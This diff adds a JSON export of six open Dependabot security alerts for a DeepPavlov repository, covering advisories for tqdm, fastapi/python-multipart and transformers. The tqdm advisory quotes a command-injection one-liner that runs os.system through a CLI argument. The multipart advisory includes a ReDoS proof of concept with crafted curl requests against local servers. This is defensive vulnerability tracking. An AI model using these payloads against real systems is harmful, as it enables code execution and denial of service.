@@ -1,0 +1,597 @@
+[
+    {
+        "number": 6,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "tqdm"
+            },
+            "manifest_path": "requirements.txt",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-g7vv-2v7x-gj9p",
+            "cve_id": "CVE-2024-34062",
+            "summary": "tqdm CLI arguments injection attack",
+            "description": "### Impact\nAny optional non-boolean CLI arguments (e.g. `--delim`, `--buf-size`, `--manpath`) are passed through python's `eval`, allowing arbitrary code execution. Example:\n\n```sh\npython -m tqdm --manpath=\"\\\" + str(exec(\\\"import os\\nos.system('echo hi && killall python3')\\\")) + \\\"\"\n```\n\n### Patches\nhttps://github.com/tqdm/tqdm/commit/4e613f84ed2ae029559f539464df83fa91feb316 released in `tqdm>=4.66.3`\n\n### Workarounds\nNone\n\n### References\n- https://github.com/tqdm/tqdm/releases/tag/v4.66.3",
+            "severity": "low",
+            "identifiers": [
+                {
+                    "value": "GHSA-g7vv-2v7x-gj9p",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-34062",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/tqdm/tqdm/security/advisories/GHSA-g7vv-2v7x-gj9p"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-34062"
+                },
+                {
+                    "url": "https://github.com/tqdm/tqdm/commit/4e613f84ed2ae029559f539464df83fa91feb316"
+                },
+                {
+                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PA3GIGHPWAHCTT4UF57LTPZGWHAX3GW6"
+                },
+                {
+                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QRECVQCCESHBS3UJOWNXQUIX725TKNY6"
+                },
+                {
+                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VA337CYUS4SLRFV2P6MX6MZ2LKFURKJC"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-g7vv-2v7x-gj9p"
+                }
+            ],
+            "published_at": "2024-05-03T19:33:28Z",
+            "updated_at": "2024-06-10T18:30:58Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "tqdm"
+                    },
+                    "severity": "low",
+                    "vulnerable_version_range": ">= 4.4.0, < 4.66.3",
+                    "first_patched_version": {
+                        "identifier": "4.66.3"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N",
+                "score": 3.9
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-74",
+                    "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "tqdm"
+            },
+            "severity": "low",
+            "vulnerable_version_range": ">= 4.4.0, < 4.66.3",
+            "first_patched_version": {
+                "identifier": "4.66.3"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/DeepPavlov/dependabot/alerts/6",
+        "html_url": "https://github.com/fcas/DeepPavlov/security/dependabot/6",
+        "created_at": "2024-05-24T01:33:42Z",
+        "updated_at": "2024-05-24T01:33:42Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 5,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "fastapi"
+            },
+            "manifest_path": "requirements.txt",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-2jv5-9r88-3w3p",
+            "cve_id": "CVE-2024-24762",
+            "summary": "python-multipart vulnerable to Content-Type Header ReDoS",
+            "description": "### Summary\n\nWhen using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.\n\nAn attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.\n\nThis can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n\nThis only applies when the app uses form data, parsed with `python-multipart`.\n\n### Details\n\nA regular HTTP `Content-Type` header could look like:\n\n```\nContent-Type: text/html; charset=utf-8\n```\n\n`python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\n\nA custom option could be made and sent to the server to break it with:\n\n```\nContent-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n```\n\n### PoC\n\nCreate a simple WSGI application, that just parses the `Content-Type`, and run it with `python main.py`:\n\n```Python\n# main.py\nfrom wsgiref.simple_server import make_server\nfrom wsgiref.validate import validator\n\nfrom multipart.multipart import parse_options_header\n\n\ndef simple_app(environ, start_response):\n    _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])\n\n    start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])\n    return [b\"Ok\"]\n\n\nhttpd = make_server(\"\", 8123, validator(simple_app))\nprint(\"Serving on port 8123...\")\nhttpd.serve_forever()\n```\n\nThen send the attacking request with:\n\n```console\n$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/'\n```\n\n### Impact\n\nIt's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data. This way it also affects other libraries using Starlette, like FastAPI.\n\n### Original Report\n\nThis was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r\n\n<details>\n<summary>Original report to FastAPI</summary>\n\nHey Tiangolo!\n\nMy name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).\n\nHere are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:\n\n```Python\nfrom typing import Annotated\nfrom fastapi.responses import HTMLResponse\nfrom fastapi import FastAPI,Form\nfrom pydantic import BaseModel\n\nclass Item(BaseModel):\n    username: str\n\napp = FastAPI()\n\n@app.get(\"/\", response_class=HTMLResponse)\nasync def index():\n    return HTMLResponse(\"Test\", status_code=200)\n\n@app.post(\"/submit/\")\nasync def submit(username: Annotated[str, Form()]):\n    return {\"username\": username}\n\n@app.post(\"/submit_json/\")\nasync def submit_json(item: Item):\n    return {\"username\": item.username}\n```\n\nI'm running the above with uvicorn with the following command:\n\n```console\nuvicorn server:app\n```\n\nThen run the following cUrl command:\n\n```\ncurl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'\n```\n\nYou'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%\n\nYou can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.\n\nIf you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.\n\nCheers\n\n#### Impact\n\nAn attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.\n\n#### Occurrences\n\n[params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)\n\n</details>",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-2jv5-9r88-3w3p",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-24762",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p"
+                },
+                {
+                    "url": "https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4"
+                },
+                {
+                    "url": "https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74"
+                },
+                {
+                    "url": "https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238"
+                },
+                {
+                    "url": "https://github.com/tiangolo/fastapi/security/advisories/GHSA-qf9m-vfgh-m389"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-24762"
+                },
+                {
+                    "url": "https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5"
+                },
+                {
+                    "url": "https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml"
+                },
+                {
+                    "url": "https://github.com/tiangolo/fastapi/releases/tag/0.109.1"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-2jv5-9r88-3w3p"
+                }
+            ],
+            "published_at": "2024-02-12T17:28:12Z",
+            "updated_at": "2024-02-16T23:41:49Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "python-multipart"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "<= 0.0.6",
+                    "first_patched_version": {
+                        "identifier": "0.0.7"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "fastapi"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "<= 0.109.0",
+                    "first_patched_version": {
+                        "identifier": "0.109.1"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "starlette"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "<= 0.36.1",
+                    "first_patched_version": {
+                        "identifier": "0.36.2"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "score": 7.5
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-400",
+                    "name": "Uncontrolled Resource Consumption"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "fastapi"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "<= 0.109.0",
+            "first_patched_version": {
+                "identifier": "0.109.1"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/DeepPavlov/dependabot/alerts/5",
+        "html_url": "https://github.com/fcas/DeepPavlov/security/dependabot/5",
+        "created_at": "2024-05-24T01:33:42Z",
+        "updated_at": "2024-05-24T01:33:42Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 4,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "manifest_path": "deeppavlov/requirements/transformers.txt",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-37q5-v5qm-c9v8",
+            "cve_id": "CVE-2024-3568",
+            "summary": "Transformers Deserialization of Untrusted Data vulnerability",
+            "description": "The huggingface/transformers library is vulnerable to arbitrary code execution through deserialization of untrusted data within the `load_repo_checkpoint()` function of the `TFPreTrainedModel()` class. Attackers can execute arbitrary code and commands by crafting a malicious serialized payload, exploiting the use of `pickle.load()` on data from potentially untrusted sources. This vulnerability allows for remote code execution (RCE) by deceiving victims into loading a seemingly harmless checkpoint during a normal training process, thereby enabling attackers to execute arbitrary code on the targeted machine.",
+            "severity": "low",
+            "identifiers": [
+                {
+                    "value": "GHSA-37q5-v5qm-c9v8",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-3568",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-3568"
+                },
+                {
+                    "url": "https://github.com/huggingface/transformers/commit/693667b8ac8138b83f8adb6522ddaf42fa07c125"
+                },
+                {
+                    "url": "https://huntr.com/bounties/b3c36992-5264-4d7f-9906-a996efafba8f"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-37q5-v5qm-c9v8"
+                }
+            ],
+            "published_at": "2024-04-10T18:30:48Z",
+            "updated_at": "2024-04-10T22:20:57Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "transformers"
+                    },
+                    "severity": "low",
+                    "vulnerable_version_range": "< 4.38.0",
+                    "first_patched_version": {
+                        "identifier": "4.38.0"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:N/A:L",
+                "score": 3.4
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-502",
+                    "name": "Deserialization of Untrusted Data"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "severity": "low",
+            "vulnerable_version_range": "< 4.38.0",
+            "first_patched_version": {
+                "identifier": "4.38.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/DeepPavlov/dependabot/alerts/4",
+        "html_url": "https://github.com/fcas/DeepPavlov/security/dependabot/4",
+        "created_at": "2024-05-24T01:33:42Z",
+        "updated_at": "2024-05-24T01:33:42Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 3,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "manifest_path": "deeppavlov/requirements/transformers.txt",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-3863-2447-669p",
+            "cve_id": "CVE-2023-6730",
+            "summary": "transformers has a Deserialization of Untrusted Data vulnerability",
+            "description": "Deserialization of Untrusted Data in GitHub repository huggingface/transformers prior to 4.36.0.",
+            "severity": "critical",
+            "identifiers": [
+                {
+                    "value": "GHSA-3863-2447-669p",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2023-6730",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-6730"
+                },
+                {
+                    "url": "https://github.com/huggingface/transformers/commit/1d63b0ec361e7a38f1339385e8a5a855085532ce"
+                },
+                {
+                    "url": "https://huntr.com/bounties/423611ee-7a2a-442a-babb-3ed2f8385c16"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-3863-2447-669p"
+                }
+            ],
+            "published_at": "2023-12-19T15:30:30Z",
+            "updated_at": "2023-12-28T05:05:45Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "transformers"
+                    },
+                    "severity": "critical",
+                    "vulnerable_version_range": "< 4.36.0",
+                    "first_patched_version": {
+                        "identifier": "4.36.0"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H",
+                "score": 9.0
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-502",
+                    "name": "Deserialization of Untrusted Data"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "severity": "critical",
+            "vulnerable_version_range": "< 4.36.0",
+            "first_patched_version": {
+                "identifier": "4.36.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/DeepPavlov/dependabot/alerts/3",
+        "html_url": "https://github.com/fcas/DeepPavlov/security/dependabot/3",
+        "created_at": "2024-05-24T01:33:42Z",
+        "updated_at": "2024-05-24T01:33:42Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 2,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "manifest_path": "deeppavlov/requirements/transformers.txt",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-v68g-wm8c-6x7j",
+            "cve_id": "CVE-2023-7018",
+            "summary": "transformers has a Deserialization of Untrusted Data vulnerability",
+            "description": "Deserialization of Untrusted Data in GitHub repository huggingface/transformers prior to 4.36.",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-v68g-wm8c-6x7j",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2023-7018",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-7018"
+                },
+                {
+                    "url": "https://github.com/huggingface/transformers/commit/1d63b0ec361e7a38f1339385e8a5a855085532ce"
+                },
+                {
+                    "url": "https://huntr.com/bounties/e1a3e548-e53a-48df-b708-9ee62140963c"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-v68g-wm8c-6x7j"
+                }
+            ],
+            "published_at": "2023-12-20T18:30:32Z",
+            "updated_at": "2024-01-02T15:27:26Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "transformers"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 4.36.0",
+                    "first_patched_version": {
+                        "identifier": "4.36.0"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+                "score": 7.8
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-502",
+                    "name": "Deserialization of Untrusted Data"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 4.36.0",
+            "first_patched_version": {
+                "identifier": "4.36.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/DeepPavlov/dependabot/alerts/2",
+        "html_url": "https://github.com/fcas/DeepPavlov/security/dependabot/2",
+        "created_at": "2024-05-24T01:33:42Z",
+        "updated_at": "2024-05-24T01:33:42Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 1,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "manifest_path": "deeppavlov/requirements/transformers.txt",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-282v-666c-3fvg",
+            "cve_id": "CVE-2023-2800",
+            "summary": "transformers has Insecure Temporary File",
+            "description": "Insecure Temporary File in GitHub repository huggingface/transformers 4.29.2 and prior. A fix is available at commit 80ca92470938bbcc348e2d9cf4734c7c25cb1c43 and has been released as part of version 4.30.0.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-282v-666c-3fvg",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2023-2800",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2800"
+                },
+                {
+                    "url": "https://github.com/huggingface/transformers/commit/80ca92470938bbcc348e2d9cf4734c7c25cb1c43"
+                },
+                {
+                    "url": "https://huntr.dev/bounties/a3867b4e-6701-4418-8c20-3c6e7084a44a"
+                },
+                {
+                    "url": "https://github.com/huggingface/transformers/pull/23372"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-282v-666c-3fvg"
+                }
+            ],
+            "published_at": "2023-05-18T18:30:35Z",
+            "updated_at": "2023-11-09T05:05:04Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "transformers"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "< 4.30.0",
+                    "first_patched_version": {
+                        "identifier": "4.30.0"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H",
+                "score": 4.7
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-377",
+                    "name": "Insecure Temporary File"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "< 4.30.0",
+            "first_patched_version": {
+                "identifier": "4.30.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/DeepPavlov/dependabot/alerts/1",
+        "html_url": "https://github.com/fcas/DeepPavlov/security/dependabot/1",
+        "created_at": "2024-05-24T01:33:42Z",
+        "updated_at": "2024-05-24T01:33:42Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    }
+]
